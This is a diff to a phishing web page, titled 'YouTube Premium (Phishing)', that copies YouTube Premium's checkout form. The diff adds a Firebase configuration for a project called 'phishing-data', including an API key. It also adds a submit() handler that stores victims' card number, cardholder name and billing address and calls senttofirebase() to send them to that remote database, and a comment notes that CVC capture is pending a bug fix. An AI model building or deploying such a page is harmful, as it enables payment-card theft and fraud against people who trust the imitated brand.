@@ -6,6 +6,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube Premium (Phishing)</title>
 
+    <!-- js -->
+    <script src="main.js"></script>
+
     <!-- css -->
     <link rel="stylesheet" href="style.css">
 
@@ -18,35 +21,34 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css"
         integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
 
-    <!-- Google Tag Manager -->
-    <!-- <script>
-        (function(w, d, s, l, i) {
-            w[l] = w[l] || [];
-            w[l].push({
-                'gtm.start': new Date().getTime(),
-                event: 'gtm.js'
-            });
-            var f = d.getElementsByTagName(s)[0],
-                j = d.createElement(s),
-                dl = l != 'dataLayer' ? '&l=' + l : '';
-            j.async = true;
-            j.src =
-                'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
-            f.parentNode.insertBefore(j, f);
-        })(window, document, 'script', 'dataLayer', 'GTM-PLDGLJQ');
-    </script> -->
+    <!-- firebase & Analytics -->
+    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+         https://firebase.google.com/docs/web/setup#available-libraries -->
+    <script src="https://www.gstatic.com/firebasejs/8.0.1/firebase-analytics.js"></script>
+
+    <script>
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        var firebaseConfig = {
+            apiKey: "AIzaSyDgUD9l-IyrQgV1s7eU4OGPXzvMaXXJyM0",
+            authDomain: "phishing-data.firebaseapp.com",
+            databaseURL: "https://phishing-data.firebaseio.com",
+            projectId: "phishing-data",
+            storageBucket: "phishing-data.appspot.com",
+            messagingSenderId: "239566087596",
+            appId: "1:239566087596:web:5788cc5aa63ab450914609",
+            measurementId: "G-FRFVJDFHSC"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        firebase.analytics();
+    </script>
 
 </head>
 
 <body>
-
-    <!-- Google Tag Manager (noscript) -->
-    <!-- <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PLDGLJQ"
-    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript> -->
-    <!-- End Google Tag Manager (noscript) -->
-
-    <!-------------------------------------------------------------------------------------------- Nav Bar -->
-    <!------------------------------------------------------------------------------------------------------->
 
     <header class="nav-bar">
         <!-- section-left : logo, menu bar -->
@@ -408,89 +410,97 @@
                                         <div class="row">
                                             <!-- Card num -->
                                             <div class="col-6">
-                                                <input id="cardNumber" class="form__input" autocomplete="off" type="text" placeholder=" ">
+                                                <input class="form__input" autocomplete="off"
+                                                    type="text" placeholder=" " id="cardnum" >
                                                 <label for="" class="form__label">Card number</label>
                                             </div>
                                             <!-- MM/YY-->
                                             <div class="col-1">
                                                 <div>
-                                                    <input id="cardNumber" class="form__input" autocomplete="off" type="text" placeholder=" ">
+                                                    <input class="form__input" autocomplete="off"
+                                                        type="text" placeholder=" " id="month">
                                                     <label for="" class="form__label">MM</label>
                                                 </div>
                                             </div>
-                                            
+
                                             <span>/</span>
 
                                             <div class="col-1">
                                                 <div>
-                                                    <input id="cardNumber" class="form__input" autocomplete="off" type="text" placeholder=" ">
+                                                    <input class="form__input" autocomplete="off"
+                                                        type="text" placeholder=" " id="year">
                                                     <label for="" class="form__label">YY</label>
                                                 </div>
                                             </div>
-                                                
-                                            </div>
-                                            <div class="col-2">
-                                                <input id="cardNumber" class="form__input" autocomplete="off" type="text" placeholder=" ">
-                                                <label for="" class="form__label">CVC</label>
-                                            </div>
-                                        </div>
 
-                                        <div class="row">
-                                            <div class="col-12">
-                                                <input id="cardNumber" class="form__input" autocomplete="off" type="text" placeholder=" ">
-                                                <label for="" class="form__label">Cardholder name</label>
-                                            </div>
+                                        </div>
+                                        <div class="col-2">
+                                            <input class="form__input" autocomplete="off" type="text"
+                                                placeholder=" " id="cvc">
+                                            <label for="" class="form__label">CVC</label>
+                                        </div>
+                                    </div>
+
+                                    <div class="row">
+                                        <div class="col-12">
+                                            <input class="form__input" autocomplete="off" type="text"
+                                                placeholder=" " id="cardname">
+                                            <label for="" class="form__label">Cardholder name</label>
                                         </div>
                                     </div>
                                 </div>
-
-                                <div class="row d-flex align-items-center">
-                                    <div class="col-1 text-center">
-                                        <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-geo-alt-fill" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
-                                            <path fill-rule="evenodd" d="M8 16s6-5.686 6-10A6 6 0 0 0 2 6c0 4.314 6 10 6 10zm0-7a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/>
-                                        </svg>
-                                    </div>
-
-                                    <div class="col-11">
-                                        <input id="cardNumber" class="form__input" autocomplete="off" type="text" placeholder=" ">
-                                        <label for="" class="form__label">Billing address</label>
-                                    </div>
-                                </div>
-
-                            </section>
                         </div>
+
+                        <div class="row d-flex align-items-center">
+                            <div class="col-1 text-center">
+                                <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-geo-alt-fill"
+                                    fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd"
+                                        d="M8 16s6-5.686 6-10A6 6 0 0 0 2 6c0 4.314 6 10 6 10zm0-7a3 3 0 1 0 0-6 3 3 0 0 0 0 6z" />
+                                </svg>
+                            </div>
+
+                            <div class="col-11">
+                                <input class="form__input" autocomplete="off" type="text"
+                                    placeholder=" " id="address">
+                                <label for="" class="form__label">Billing address</label>
+                            </div>
+                        </div>
+
+                        </section>
                     </div>
-
-                    <!-- permission -->
-                    <div class="permission-content">
-                        <div class="per-area">
-                            <strong>
-                                Billing starts on Dec 6, 2020, the end of your free trial, and will renew automatically
-                                every month.
-                            </strong>
-                            <br>
-                            Payments won’t be refunded for partial billing periods. Cancel anytime in YouTube settings.
-                            <a href="#">Learn more.</a>
-                        </div>
-                        <div class="per-area">
-                            All price include applicable taxes. By continuing you verify that you are at least 18 years
-                            old and agree to
-                            <a href="#">these terms.</a>
-                        </div>
-                    </div>
-
-                    <!-- Button -->
-                    <div class="button-wrapper">
-                        <div style="float: right;">
-                            <button id="myBtn" class="btn btn-primary px-4 buy-btn" style="background-color: #065fd4;">
-                                BUY
-                            </button>
-                        </div>
-                    </div>
-
                 </div>
+
+                <!-- permission -->
+                <div class="permission-content">
+                    <div class="per-area">
+                        <strong>
+                            Billing starts on Dec 6, 2020, the end of your free trial, and will renew automatically
+                            every month.
+                        </strong>
+                        <br>
+                        Payments won’t be refunded for partial billing periods. Cancel anytime in YouTube settings.
+                        <a href="#">Learn more.</a>
+                    </div>
+                    <div class="per-area">
+                        All price include applicable taxes. By continuing you verify that you are at least 18 years
+                        old and agree to
+                        <a href="#">these terms.</a>
+                    </div>
+                </div>
+
+                <!-- Button -->
+                <div class="button-wrapper">
+                    <div style="float: right;">
+                        <button id="myBtn" class="btn btn-primary px-4 buy-btn" style="background-color: #065fd4;" onclick="submit()">
+                            BUY
+                        </button>
+                    </div>
+                </div>
+
             </div>
         </div>
+    </div>
     </div>
 
 
@@ -544,6 +554,16 @@
         function replace() {
             document.getElementById('link1').style.display = "none";
             document.getElementById('link1_detail').style.display = "block";
+        }
+
+        //local storage
+        function submit(){
+            localStorage.setItem("cradit", document.getElementById('cardnum').value);
+            // cvc คอมเม้นต์เพราะ Front มีปัญหาทำให้ยังกรอกเลขไม่ได้
+            //localStorage.setItem("cvc", document.getElementById('cvc').value);
+            localStorage.setItem("name", document.getElementById('cardname').value);
+            localStorage.setItem("address", document.getElementById('address').value);
+            senttofirebase();
         }
     </script>
 </body>
